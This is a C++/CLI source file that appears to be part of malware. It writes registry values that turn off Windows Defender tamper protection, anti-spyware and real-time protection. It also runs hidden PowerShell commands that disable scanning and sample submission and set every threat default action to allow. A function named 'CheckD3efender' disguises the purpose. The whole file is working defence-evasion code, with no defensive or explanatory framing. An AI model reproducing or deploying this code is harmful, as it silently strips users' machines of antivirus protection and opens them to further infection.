#include "pch.h"
#include "asv.h"

using namespace System;
using namespace Microsoft::Win32;
using namespace System::Diagnostics;
using namespace System::Security::Principal;
using namespace System::Threading;
void RegistryEdit(String^ regPath, String^ name, String^ value)
{
    try
    {
        RegistryKey^ key = Registry::LocalMachine->OpenSubKey(regPath, RegistryKeyPermissionCheck::ReadWriteSubTree);
        if (key->GetValue(name) != (Object^)value)
            key->SetValue(name, value, RegistryValueKind::DWord);
    }
    catch (Exception^ j) {}
}
void RunPS(String^ args)
{
     Process^ proc = gcnew Process;
     proc->StartInfo->FileName = "powershell";
     proc->StartInfo->Arguments = args;
     proc->StartInfo->WindowStyle = ProcessWindowStyle::Hidden;
     proc->StartInfo->CreateNoWindow = true;
     proc->Start();
 }
 void runme() 
 {
     RegistryEdit("SOFTWARE\\Microsoft\\Windows Defender\\Features", "TamperProtection", "0");
     RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1");
     RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1");
     RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1");
     RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
 }
 void CheckD3efender()
{
    RunPS("Set-MpPreference -DisableRealtimeMonitoring $true"); 
    RunPS("Set-MpPreference -DisableBehaviorMonitoring $true"); 
    RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");
    RunPS("Set-MpPreference -DisableIOAVProtection $true"); 
    RunPS("Set-MpPreference -DisablePrivacyMode $true"); 
    RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"); 
    RunPS("Set-MpPreference -DisableArchiveScanning $true"); 
    RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true"); 
    RunPS("Set-MpPreference -DisableScriptScanning $true");
    RunPS("Set-MpPreference -SubmitSamplesConsent 2"); 
    RunPS("Set-MpPreference -MAPSReporting 0");
    RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force"); 
    RunPS("Set-MpPreference -ModerateThreatDefaultAction 6"); 
    RunPS("Set-MpPreference -LowThreatDefaultAction 6");
    RunPS("Set-MpPreference -SevereThreatDefaultAction 6");
}